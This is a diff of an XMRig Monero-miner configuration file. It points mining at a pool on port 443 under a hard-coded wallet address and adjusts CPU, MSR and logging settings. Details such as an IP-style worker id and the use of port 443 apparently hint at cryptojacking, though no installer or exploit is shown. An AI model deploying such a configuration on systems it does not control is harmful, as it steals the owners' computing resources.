@@ -1,7 +1,7 @@
 {
     "api": {
         "id": null,
-        "worker-id": "ip0001"
+        "worker-id": null
     },
     "http": {
         "enabled": false,
@@ -18,7 +18,7 @@
         "init": -1,
         "init-avx2": -1,
         "mode": "auto",
-        "1gb-pages": true,
+        "1gb-pages": false,
         "rdmsr": true,
         "wrmsr": true,
         "cache_qos": false,
@@ -31,7 +31,17 @@
         "huge-pages-jit": false,
         "hw-aes": null,
         "priority": null,
-        "memory-pool": false
+        "memory-pool": false,
+        "yield": true,
+        "asm": true,
+        "argon2-impl": null,
+        "astrobwt-max-size": 550,
+        "astrobwt-avx2": false,
+        "*": {
+            "intensity": 1,
+            "threads": 4,
+            "affinity": -1
+        }
     },
     "opencl": {
         "enabled": false,
@@ -45,16 +55,17 @@
         "loader": null,
         "nvml": true
     },
-    "log-file": "./x.log",
-    "donate-level": 0,
+    "log-file": "/var/log/xmrig.log",
+    "donate-level": 1,
+    "donate-over-proxy": 1,
     "pools": [
         {
             "algo": null,
             "coin": "monero",
-            "url": "116.203.206.127:443",
+            "url": "ehttp.info:443",
             "user": "44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p",
             "pass": "x",
-            "rig-id": "ip0001",
+            "rig-id": null,
             "nicehash": false,
             "keepalive": true,
             "enabled": true,
